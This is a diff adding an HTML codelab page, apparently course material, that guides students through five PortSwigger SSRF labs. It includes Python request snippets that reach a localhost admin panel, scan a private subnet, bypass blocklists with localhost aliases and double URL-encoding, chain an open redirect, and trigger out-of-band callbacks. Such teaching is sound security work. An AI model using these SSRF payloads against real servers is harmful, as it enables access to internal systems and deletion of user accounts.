@@ -1,0 +1,126 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>2.2: SSRF</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W2.2_ssrf" title="2.2: SSRF" environment="web" feedback-link="https://docs.google.com/document/d/1P7Wk1OjnGx-0M-ranrdkR2mx8T2ONgr4-3z4WoN-oMY">
+<google-codelab-step label="ssrf (1)" duration="5">
+<p>Perform the following labs demonstrating Server-Side Request Forgery.</p>
+<h2 is-upgraded><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost" target="_blank">basic-ssrf-against-localhost</a></h2>
+<p>A basic SSRF attack requires the web application to accept URLs from the user that it subsequently retrieves itself. Web proxies and web application firewalls are examples of applications that do this. Unfortunately, such devices are connected to sensitive internal networks. If internal servers implicitly trust requests coming in from other internal sources, any request from the adversary through the proxy or firewall will succeed where a direct access by the adversary will fail. In this level, an admin interface for a web site has been implemented to only allow access from local users. </p>
+<ul>
+<li><strong>Take a screenshot of the message that is returned when you attempt to visit the </strong><strong><code>/admin</code></strong><strong> path of your site.</strong></li>
+</ul>
+<p>Visit a product page on the site. Right-click the &#34;Check Stock&#34; button and click on &#34;Inspect&#34; to bring up Developer Tools. Click the button to check the stock and then visit the &#34;Network&#34; tab in Developer Tools to view the POST request that is sent, including its payload.<br><img style="width:476px" src="img/2adb26deeb4ae1a9.png"><br></p>
+<ul>
+<li><strong>Take a screenshot that shows the Content-Type: request header that specifies the format of the form submission</strong></li>
+<li><strong>Then, take a screenshot of the form submission payload. </strong></li>
+</ul>
+<p>We can write a Python script that performs this request. Using the information obtained from the POST request, fill in the script and run it. Validate that you can successfully check your site&#39;s stock for the item.</p>
+<pre><code># &lt;FMI&gt; (Fill Me In) denotes a value you will need to modify
+import requests
+stock_url = &#39;&lt;FMI&gt;&#39;
+
+stock_api_data = {
+    &#39;stockApi&#39;: &#39;&lt;FMI&gt;&#39;
+}
+resp = requests.post(stock_url, data=stock_api_data)
+print(resp.text)</code></pre>
+<p>As the request shows, the form includes a URL that is then used by the product application to create a request that queries the backend stock API server. If an adversary replaces this with another URL, access to a sensitive internal site can occur. In this case, a URL such as the local admin interface of the product application site can be allowed that was denied previously. Replace the stockAPI URL with the URL of the admin interface below and re-run your script.</p>
+<pre><code>http://localhost/admin</code></pre>
+<p>As the output shows, a set of links for deleting users is revealed. With this, modify the Python program again to cause the web server to delete <code>carlos</code>&#39;s account and solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="ssrf (2)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system" target="_blank">basic-ssrf-against-backend-system</a></h2>
+<p>While the previous example targets a local interface running on the product application site, one can easily target any internal server that the site is connected to. For example, a private server running an admin interface on a private IP address can be accessed.</p>
+<pre><code>http://192.168.0.X:8080/admin</code></pre>
+<p>Modify your script to search for a private backend system that the admin interface is running on.</p>
+<p>Then repeat the deletion of the account. A helpful code snippet is below:</p>
+<pre><code>for i in range(1,255):
+    ssrf_data = {
+        &#39;stockApi&#39; : f&#39;http://192.168.0.{i}:8080/admin&#39;
+    }
+    resp = requests.post(stock_url, data=ssrf_data)
+    if resp.status_code == 200:
+        print(f&#39;Admin interface at 192.168.0.{i}&#39;)
+        break</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="ssrf (3)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter" target="_blank">ssrf-with-blacklist-filter</a></h2>
+<p>The product application site can implement filtering to remove sensitive addresses and files from incoming requests. Unfortunately, getting filters right is a difficult task. For example, to filter out connections to <code>'localhost'</code>, one must filter out its aliases such as:</p>
+<pre><code>% ping 127.0.0.1    
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.059 ms
+
+% ping 2130706433
+PING 2130706433 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.060 ms
+
+% ping 017700000001
+PING 017700000001 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.062 ms
+
+% ping 127.1         
+PING 127.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.060 ms</code></pre>
+<p>In this level, the site fails to filter all versions of localhost. In addition, it filters out the admin string, but does so before a superfluous URL decode. Modify the Python script to bypass both filters. Note that when specifying <code>data</code> in a Python requests form submission, the payload is automatically url-encoded. Thus, if one specifies &#39;<code>admi%6E</code>&#39; as a field in the submission, the server will receive <code>admi%2561</code>. Then use the Python script to delete the user <code>carlos</code> to solve the lab.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="ssrf (4)" duration="5">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection" target="_blank">ssrf-filter-bypass-via-open-redirection</a></h2>
+<p>Redirects are common in web sites. For example, if you access a part of a site that requires authorization, you may be redirected to a login page that will then redirect you back to the part you were on upon login. In this case, the initial access may send its URL as a parameter to the login route so that the login route can perform the appropriate redirection afterwards.</p>
+<p>The web site for this level contains an unvalidated redirect when implementing product navigation. Visit the site and click on a product. At the bottom, find the &#34;Next product&#34; link and copy and paste its URL to examine it. Answer the following questions for subsequent parts of this lab.</p>
+<ul>
+<li><strong>What is the </strong><strong><code>page</code></strong><strong> that implements the redirect?</strong></li>
+<li><strong>What </strong><strong><code>parameter</code></strong><strong> specifies the URI that the page uses to redirect the browser to?</strong></li>
+</ul>
+<p>We will use this vulnerability to perform an SSRF attack. The admin interface is given to us at <a href="http://192.168.0.12:8080" target="_blank">http://192.168.0.12:8080</a>. However, unlike prior levels, the <code>stockApi</code> parameter is strictly validated to prevent access to private servers directly. We can, however, use the product navigation page, to trick the web server into redirecting itself to the admin interface. Consider the following Python snippet.</p>
+<pre><code>page = &#39;/product/&lt;FMI&gt;&#39;
+parameter = &#39;&lt;FMI&gt;&#39;
+open_redir_path = f&#39;{page}?{parameter}={delete_url}&#39;
+
+stockapi_data = {
+    &#39;stockApi&#39; : open_redir_path
+}
+resp = requests.post(stock_url, data=stockapi_data)</code></pre>
+<p>In this code, the web server is given a stockApi URL that is instead a link to the vulnerable open redirection page. As a redirection parameter, it is tricked into sending the URL that will delete the <code>carlos</code> account. Fill in the appropriate values to solve the level.</p>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="ssrf/blind" duration="3">
+<h2 is-upgraded><a href="https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection" target="_blank">out-of-band-detection</a></h2>
+<p>This site uses analytics software which fetches the URL specified in the HTTP <code>Referer:</code> request header when a product page is loaded. If the site blindly fetches any URL it has been given, an adversary can easily perform an SSRF attack. To solve the lab, we only need to trick the site into accessing the public Burp Collaborator server.</p>
+<p>Programmatically, this can be easily done using Python requests and its <code>headers</code> keyword for specifying HTTP request headers as shown below:</p>
+<pre><code>s.get(url, headers={&#39;referer&#39; : &#34;https://burpcollaborator.net&#34;})</code></pre>
+<ul>
+<li><strong>Take a screenshot showing completion of the level that includes the level URL and your OdinId</strong></li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
